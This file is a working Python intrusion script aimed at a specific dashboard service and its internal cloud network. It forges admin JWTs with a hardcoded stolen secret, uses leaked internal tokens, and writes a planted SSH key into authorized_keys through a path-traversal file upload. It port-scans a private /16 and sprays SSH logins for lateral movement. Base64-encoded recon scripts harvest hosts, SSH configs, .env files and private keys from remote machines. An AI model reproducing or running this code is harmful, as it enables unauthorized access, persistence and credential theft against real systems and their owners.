#!/usr/bin/env python3
# i29455 Round B: fixed stdin bug; scan 172.31/16(AWS /20 + .0/24); ssh-test; harvest agent-door 172.31.27.51
import os, sys, json, base64, hmac, hashlib, subprocess, random, urllib.parse as up, time

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AGENT = "agent-047f1d22"; AUID = "fc7c3730-4219-11f1-ac43-525400595be1"; ACUST = "aro"; AIP = "18.142.48.45"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"; UPATH = UF + "/authorized_keys"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"

SCANNER = r'''import socket,concurrent.futures
PORTS=[22,80,443,3000,3306,5432,6379,2375,9000,8080]
ips=[]
for b in range(16,32):
    for c in range(1,255):
        ips.append("172.31.%d.%d"%(b,c))
for c in range(1,255):
    ips.append("172.31.0.%d"%c)
def chk(a):
    ip,p=a
    s=socket.socket(); s.settimeout(0.45)
    try:
        if s.connect_ex((ip,p))==0: return (ip,p)
    except Exception: pass
    finally: s.close()
    return None
targets=[(ip,p) for ip in ips for p in PORTS]
n=0
with concurrent.futures.ThreadPoolExecutor(max_workers=300) as ex:
    for r in ex.map(chk,targets,chunksize=40):
        if r:
            print("OPEN %s:%d"%r,flush=True); n+=1
print("SCAN_DONE open=%d scanned=%d"%(n,len(targets)),flush=True)
'''

ADH = r'''#!/bin/bash
exec 2>&1
echo "=== AD_ID ==="; id; hostname; hostname -I; sudo -n id 2>&1|head -2
echo "=== AD_HOSTS ==="; cat /etc/hosts
echo "=== AD_RESOLV ==="; cat /etc/resolv.conf
echo "=== AD_GETENT ==="; for n in lumii1 lumii2 lumii3 lumii4 lumii5 lumii6 lumii7 lumii8 lumii9 lumii10 lumii11 lumii12 lumii13 lumii14 lumii15 lumii16 lumii17 lumii18 lumii19 lumii20 intelora1 intelora2 intelora3 intelora4 intelora5 intelora6 intelora7 intelora8 intelora9 intelora10 intelora11 intelora12 intelora13 agent-door in-coder5 ezcoder8 coder2; do printf "%s=" $n; getent hosts $n | awk "{print \$1}" | tr "\n" " "; echo; done
echo "=== AD_SSH ==="; ls -la ~/.ssh 2>/dev/null; echo "--config--"; cat ~/.ssh/config 2>/dev/null; echo "--known(first col)--"; cut -d" " -f1 ~/.ssh/known_hosts 2>/dev/null | grep -v "^|" | sort -u | head -40
echo "=== AD_HOME ==="; ls -la /home; echo "--opt--"; ls -la /opt 2>/dev/null; echo "--etc-ci--"; ls -la /etc/ci /opt/src 2>/dev/null | head -30
echo "=== AD_DOCKER ==="; sudo docker ps --format "{{.Names}}|{{.Image}}|{{.Ports}}" 2>/dev/null | head -20
echo "=== AD_ENVFILES ==="; sudo find /etc /opt /home -maxdepth 3 -name ".env*" -o -maxdepth 3 -name "*.env" 2>/dev/null | head -20
echo "=== AD_KEYS ==="; sudo find /home /root /opt /etc -maxdepth 4 -name "id_*" -o -maxdepth 4 -name "*.pem" 2>/dev/null | head -30
echo "=== AD_END ==="
'''

IPS = "172.31.0.248 172.31.16.28 172.31.17.158 172.31.17.162 172.31.18.3 172.31.18.178 172.31.19.141 172.31.20.106 172.31.20.166 172.31.21.110 172.31.21.175 172.31.22.209 172.31.23.49 172.31.23.130 172.31.25.220 172.31.25.244 172.31.26.36 172.31.26.221 172.31.27.51"

SCRIPT = r'''#!/bin/bash
exec 2>&1 </dev/null
export LC_ALL=C
echo "=== ID ==="; id; hostname
echo "=== ADDR ==="; ip -br addr 2>/dev/null; echo "--route--"; ip route
echo "=== TS ==="; command -v tailscale || echo no-tailscale; tailscale status 2>&1 | head -20
echo "=== RESOLV ==="; cat /etc/resolv.conf
echo "=== GETENT ==="; for n in lumii1 lumii2 lumii3 lumii4 lumii5 lumii6 lumii7 lumii8 lumii9 lumii10 lumii11 lumii12 lumii13 lumii14 lumii15 lumii16 lumii17 lumii18 lumii19 lumii20 intelora1 intelora2 intelora3 intelora4 intelora5 intelora6 intelora7 intelora8 intelora9 intelora10 intelora11 intelora12 intelora13 agent-door in-coder5 ezcoder8 coder2 lumii-ai; do printf "%s=" $n; getent hosts $n 2>/dev/null | awk "{print \$1}" | tr "\n" " "; echo; done
echo "=== SCANNER ==="
echo __SCB64__ | base64 -d > /tmp/sc29455.py
timeout 300 python3 -u /tmp/sc29455.py
echo "=== SSH_ALL ==="
K=/home/coder/.ssh/id_ed25519
for ip in __IPS__; do
  for u in coder ubuntu lumii; do
    R=$(timeout 6 ssh -n -i "$K" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 "$u@$ip" "hostname;id" 2>/dev/null)
    if [ -n "$R" ]; then echo "HIT $u@$ip :: $(echo "$R"|tr '\n' ';')"; fi
  done
done
echo "=== AGENTDOOR ==="
ssh -n -i "$K" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@172.31.27.51 "echo __ADB64__ | base64 -d > /tmp/ad.sh; bash /tmp/ad.sh" 2>&1 | head -400
echo "=== END ==="
'''

WORK = "/tmp/p29455"; os.makedirs(WORK, exist_ok=True)
KP = os.path.join(WORK, "k29455"); open(KP, "wb").write(PRIV); os.chmod(KP, 0o600)

def b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, b64(s)), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40): return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def call(path, method="GET", body=None, tok=None, bearer=None, headers=None, maxlen=8000, timeout=30):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if tok: args += ["-H", "Cookie: session=" + tok]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    for h in (headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(args, timeout=timeout)
    i = out.rfind("__CODE__")
    code = out[i+8:].strip()[:3] if i >= 0 else ""
    body = out[:i] if i >= 0 else out
    return {"code": code, "body": body[:maxlen], "len": len(body)}

def files_read(path, tok, maxlen=6000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), tok=tok, maxlen=maxlen)

def upload(tok, path, name, content):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    args = ["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
            "-F", "files=@%s;filename=%s" % (tmp, name),
            "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))]
    rc, out, err = curl(args)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__")
    return {"code": out[i+8:].strip()[:3] if i >= 0 else "", "body": (out[:i] if i >= 0 else out)[:600]}

def main():
    tok = forge({"userId": AUID, "email": "brian@x", "customer": ACUST, "role": "admin"})
    R("runtimes", call("/api/runtimes?limit=500", tok=tok, bearer=None, maxlen=400000, timeout=40))
    R("conn", call("/api/internal/connected-agents", headers=["x-internal-token: " + ADMIN_TOKEN], maxlen=200000))
    cur = files_read(UPATH, tok)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("before", {"code": cur["code"], "len": len(orig)})
    if PUB not in orig:
        content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + PUB + "\n"
        R("upload", upload(tok, UF, "authorized_keys", content))
    else:
        R("upload", "ALREADY")
    sshbase = ["ssh", "-i", KP, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
               "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=18", "-n"]
    script = SCRIPT.replace("__SCB64__", base64.b64encode(SCANNER.encode()).decode())
    script = script.replace("__ADB64__", base64.b64encode(ADH.encode()).decode())
    script = script.replace("__IPS__", IPS)
    rc, out, err = sh(sshbase + ["coder@" + AIP, "echo " + base64.b64encode(script.encode()).decode() + " | base64 -d > /tmp/rb.sh; bash /tmp/rb.sh"], timeout=590)
    R("RB_rc", rc)
    for i in range(0, len(out), 9000):
        R("RB_%02d" % (i // 9000), out[i:i+9000])
    R("RB_err", err[-2000:])
    if orig.strip() and PUB not in orig:
        R("restore", upload(tok, UF, "authorized_keys", orig))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally:
    sys.exit(1)
